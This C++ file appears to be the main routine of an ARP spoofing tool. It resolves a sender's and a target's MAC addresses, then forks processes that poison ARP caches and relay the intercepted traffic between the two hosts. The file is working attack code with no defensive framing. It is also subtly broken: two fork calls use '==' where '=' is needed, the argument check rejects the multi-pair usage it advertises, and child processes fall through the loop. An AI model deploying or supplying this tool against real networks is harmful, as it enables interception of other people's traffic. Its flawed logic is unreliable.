#include <cstdio>
#include <pcap.h>
#include "utils.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "arp-infect.h"

using namespace std;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	// if number of argc is less than 4 or odd return -1
	if (argc != 4 || argc & 1) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	string interface = argv[1];

	Mac attacker_mac;
	Ip attacker_ip;

	getAttackerInfo(interface, attacker_mac, attacker_ip);
	cout << "Attacker's MAC address : " << string(attacker_mac) << "\n";
	cout << "Attacker's IP address : " << string(attacker_ip) << "\n";
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int i=1;i<argc/2;i+=2){
		Ip sender_ip = Ip(argv[i*2]);
		Ip target_ip = Ip(argv[i*2+1]);
		pid_t arp_detect_pid, arp_frequent_pid, arp_relay_pid;
		cout << string(sender_ip) << "<->" << string(target_ip) <<"\n";
		// get sender's MAC address
		Mac sender_mac = Mac("00:00:00:00:00:00");
		cout << "get sender's info\n";
		while (sender_mac == Mac("00:00:00:00:00:00")) {
			getSenderInfo(handle, sender_mac, sender_ip, attacker_mac, attacker_ip);
		}
		cout << "done\n" << "sender's mac address is " << string(sender_mac) << "\n";

		// get target's MAC address
		Mac target_mac = Mac("00:00:00:00:00:00");
		cout << "get target's info\n";
		while (target_mac == Mac("00:00:00:00:00:00")) {
			getSenderInfo(handle, target_mac, target_ip, attacker_mac, attacker_ip);
		}
		cout << "done\n" << "target's mac address is " << string(target_mac) << "\n";
		
		// arp table infect thread open!
		if ((arp_detect_pid = fork()) < 0) {
			printf("arp detect fork failed\n");
			exit(1);
		}
		if (arp_detect_pid == 0) {
			ARPInfectDetectPacket(handle, attacker_mac, attacker_ip,
								  sender_mac, sender_ip, target_ip);
		}
		else{
			sleep(3);
		}
		if ((arp_frequent_pid == fork()) < 0) {
			printf("arp frequent fork failed\n");
			exit(1);
		}
		if (arp_frequent_pid == 0) {
			ARPInfectFrequent(handle, attacker_mac, attacker_ip,
							  sender_mac, sender_ip, target_ip);
		}
		else{
			sleep(3);
		}
		// send fake arp reply thread open!
		if ((arp_relay_pid == fork()) < 0) {
			printf("arp relay fork failed\n");
			exit(1);
		}
		if (arp_relay_pid == 0) {
			ARPRelay(handle, attacker_mac, attacker_ip,
							  sender_mac, sender_ip, target_ip, target_mac);
		}
		else{
			sleep(3);
		}
		// replace target ip(gateway ip) matches to attacker mac

	}

	pcap_close(handle);
}
